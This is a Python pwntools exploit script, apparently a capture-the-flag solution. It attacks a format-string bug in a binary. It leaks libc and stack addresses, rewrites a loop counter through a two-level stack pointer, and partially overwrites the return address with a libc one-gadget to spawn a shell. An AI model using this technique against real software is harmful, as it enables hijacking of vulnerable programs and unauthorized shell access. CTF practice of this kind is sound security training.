from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './pwn'
libname = args.LIB if args.LIB else './libc.so.6'
elf, libc = ELF(fname), ELF(libname)
context.binary = elf

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        log.info('pid: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def exp():
    # all of the following value are OS-relative, that is, different OS
    # may result in different values.
    pos_libc_start = 9
    pos_stack_ptr = 25 # 2-level stack pointer
    pos_stack_ptr2 = 25+14
    
    # offset from stack pointer to the other stack variables
    off_stack_ptr_to_ret_addr = 0xf0
    off_stack_ptr_to_i = 0x108 - 4


    # Step1. leak
    sla('name:', 'keke')
    sla('food: ', '%9$p;%25$p;%39$p')
    ru('You like ')
    data = ru('!?', drop=True).split(b';')

    libc_start_main = int(data[0], 16)
    stack_ptr = int(data[1], 16)
    stack_ptr2 = int(data[2], 16)
    libc_base = libc_start_main - 240 - libc.sym['__libc_start_main']
    addr_ogg = libc_base + 0xf1247
    ret_addr = stack_ptr - off_stack_ptr_to_ret_addr
    i_addr = stack_ptr - off_stack_ptr_to_i

    log.success(f'__libc_start_main+240 = 0x{libc_start_main:x}')
    log.success(f'stack_ptr = 0x{stack_ptr:x}')
    log.success(f'stack_ptr2 = 0x{stack_ptr2:x}')
    log.success(f'libc@0x{libc_base:x}')
    log.success(f'ret_addr@0x{ret_addr:x}')
    log.success(f'i@0x{i_addr:x}')

    # overwrite lower 2 bytes start from @addr by @data
    def overwrite(addr, data):
        cnt = addr & 0xffff
        sla('food: ', f'%{cnt}c%25$hn')
        data &= 0xffff
        sla('food: ', f'%{data}c%39$hn')
    
    # Step2. modify the 2-level pointer, make it points to the 'i' on stack
    # then modify the stack variable 'i' through this 2-level pinter, increasing 'i' to continue loop of vulnerability
    overwrite(i_addr, 8)
    
    # Step3. partially overwrite the return address to one gadget, which orignial be __lib_start_main+240.
    overwrite(ret_addr, addr_ogg)
    overwrite(ret_addr+2, addr_ogg>>16)


if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()